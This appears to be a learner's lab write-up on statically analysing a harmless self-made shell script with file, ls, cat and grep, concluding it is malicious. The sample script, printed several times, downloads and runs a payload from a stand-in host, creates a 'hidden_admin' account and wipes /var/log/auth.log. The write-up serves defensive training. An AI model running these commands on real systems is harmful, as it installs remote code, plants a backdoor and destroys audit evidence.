# Day 56 — Linux Suspicious File Analysis

## 📌 Overview

Day 56 was the first Linux capstone of the Linux phase of my MyFirstHack 90-Day Cybersecurity Journey.

The task was to investigate a suspicious-looking file using the Linux skills learned over the previous days:

- File identification
- File permissions
- Reading files
- Searching file contents
- Using command-line tools
- Evidence-based analysis
- Safe investigation practices

The important part was that the file had to be investigated **without executing it**.

---

## 🎯 Objectives

By completing this task, I aimed to:

- Identify what type of file I was examining.
- Check its permissions and properties.
- Read its contents safely.
- Search for suspicious indicators.
- Understand what the commands inside the script would do.
- Reach a verdict based on evidence.
- Document the investigation as a security analysis.

---

# 1. Creating the Suspicious File

For the lab, I created a harmless script called:

```bash
suspicious.sh
```

The purpose was to simulate a suspicious file that could be encountered during a security investigation.

The file contained:

```bash
#!/bin/bash
# system update helper
wget http://example-bad-site.test/payload.sh
bash payload.sh
useradd hidden_admin
echo "" > /var/log/auth.log
```

### ⚠️ Safety

The file was **never executed**.

The investigation was performed using static analysis only.

The goal was to understand what the script would attempt to do by reading its contents rather than allowing it to perform those actions.

---

# 2. Identify the File

I first checked what the file actually was:

```bash
file suspicious.sh
```

### Result

```text
suspicious.sh: Bourne-Again shell script, ASCII text executable
```

### Finding

The file was identified as a **Bourne-Again shell script**.

This demonstrated an important investigation principle:

> **Do not rely only on a filename. Verify what the file actually contains.**

### Important observation

The `file` command reported the script as **executable**, but that does not mean it currently had Unix execute permission.

The actual permissions were checked separately using `ls -l`.

---

# 3. Check File Properties and Permissions

I then checked the file's permissions and properties:

```bash
ls -l suspicious.sh
```

### Result

```text
-rw-r--r-- 1 shikha shikha 145 Sep 16 12:18 suspicious.sh
```

### Findings

| Property | Finding |
|---|---|
| File type | Bash script |
| Permissions | `-rw-r--r--` |
| Executable permission | No |
| Owner | `shikha` |
| Group | `shikha` |
| Size | 145 bytes |
| Modified | Sep 16 12:18 |

The permission string:

```text
-rw-r--r--
```

shows:

- Owner → `rw-`
- Group → `r--`
- Others → `r--`

There is **no `x` permission**, so the file was not executable through its Unix file permissions.

This connected directly to the Linux permissions concepts learned on Day 51.

---

# 4. Read the File Safely

Instead of executing the script, I read its contents:

```bash
cat suspicious.sh
```

The contents showed several behaviours that required investigation:

```bash
wget http://example-bad-site.test/payload.sh
bash payload.sh
useradd hidden_admin
echo "" > /var/log/auth.log
```

### What the commands indicate

| Command | What it indicates |
|---|---|
| `wget ...` | Downloads a remote file |
| `bash payload.sh` | Executes the downloaded script |
| `useradd hidden_admin` | Creates a new user account |
| `> /var/log/auth.log` | Attempts to overwrite the authentication log |

The combination of these behaviours was more important than any individual command.

---

# 5. Search for Indicators

I used `grep` to search for specific suspicious indicators.

### Search for a remote address

```bash
grep "http" suspicious.sh
```

### Result

```text
wget http://example-bad-site.test/payload.sh
```

This identified the command responsible for downloading the remote payload.

### Search for account creation

```bash
grep "useradd" suspicious.sh
```

### Result

```text
useradd hidden_admin
```

This identified the command that creates a new user account.

Using `grep` allowed me to focus on specific evidence rather than manually searching through the entire file.

---

# 6. Red Flags Identified

The investigation revealed four major indicators:

### 🌐 Remote payload download

```bash
wget http://example-bad-site.test/payload.sh
```

Downloads another script from a remote location.

### ▶️ Payload execution

```bash
bash payload.sh
```

Runs the downloaded script.

### 👤 Unexpected account creation

```bash
useradd hidden_admin
```

Creates a new user account, which could provide persistence or unauthorized access.

### 🧹 Authentication log overwrite

```bash
echo "" > /var/log/auth.log
```

Uses `>` to overwrite the authentication log, which could remove evidence of activity.

---

# 7. Verdict

## Verdict: MALICIOUS

## Confidence: HIGH

### Evidence-based reasoning

The verdict was based on the combination of behaviours found in the script.

The file downloads a remote payload, executes that payload, creates an unexpected user account, and attempts to overwrite the authentication log.

Together, these behaviours provide strong evidence of malicious intent.

> **Don't make the evidence fit the verdict. Make the verdict fit the evidence.**

---

# 8. Recommended Response

If this were a real suspicious file discovered on a system, I would:

- **Do not execute the file.**
- Preserve it as evidence.
- Keep the investigation focused on static analysis initially.
- Escalate the finding for further investigation.
- Check the system for signs that the script may already have been executed.
- Investigate unexpected accounts, downloaded payloads, and authentication-log changes.

The key principle is:

> **Preserve → Investigate → Document → Escalate**

---

# 9. Investigation Workflow

The investigation followed this basic sequence:

```text
Identify
   ↓
Check permissions
   ↓
Read contents
   ↓
Search indicators
   ↓
Analyze behaviour
   ↓
Reach evidence-based verdict
```

The Linux commands used were:

```bash
file suspicious.sh
ls -l suspicious.sh
cat suspicious.sh
grep "http" suspicious.sh
grep "useradd" suspicious.sh
```

---

# 10. What This Task Demonstrated

This capstone brought together several Linux skills learned during the previous days.

| Previous Skill | Used in Day 56 |
|---|---|
| Filesystem navigation | Locate and work with the file |
| Permissions | Check whether the file is executable |
| Users and groups | Understand `useradd` behaviour |
| Reading files | Inspect the script safely |
| `grep` | Search for indicators |
| Pipes and command composition | Understand how Linux tools can support investigation |
| Security mindset | Base the verdict on evidence |

---

# 11. Reflection

### ⏱️ Time Taken

Approximately **20 minutes**.

### Most useful command

The `file` command was especially useful because it identifies the actual type of a file rather than relying only on its filename.

> **`file` identifies what a file is, while `find` searches for files.**

### Most interesting lesson

The Linux pipe was one of the concepts that surprised me most during this phase.

Individual commands are useful on their own, but connecting simple commands allows them to work together as a larger investigation workflow.

> **In unity, there is strength.**

---

# 12. Key Learnings

### 🔎 1. Identify before investigating

A filename does not always tell the complete story. Verify the file type first.

### 🔐 2. Check permissions

File permissions provide useful information about who can access or execute a file.

### 📖 3. Read before running

A suspicious script can often reveal important information simply by reading its contents.

### 🧩 4. Look for behaviour patterns

A single command may not provide enough context. Several suspicious actions together can reveal intent.

### 📊 5. Investigate using evidence

Security conclusions should be based on observable behaviour rather than assumptions.

### 🛡️ 6. Safe investigation matters

Unknown files should not be executed just to discover what they do.

---

# 💡 Final Takeaway

> **A security investigator doesn't need to make a suspicious file act. They need to understand what the evidence is already telling them.**

Day 56 marked a shift from learning individual Linux commands to using those commands together as a security investigation toolkit.

**56 days completed — 34 days remaining.**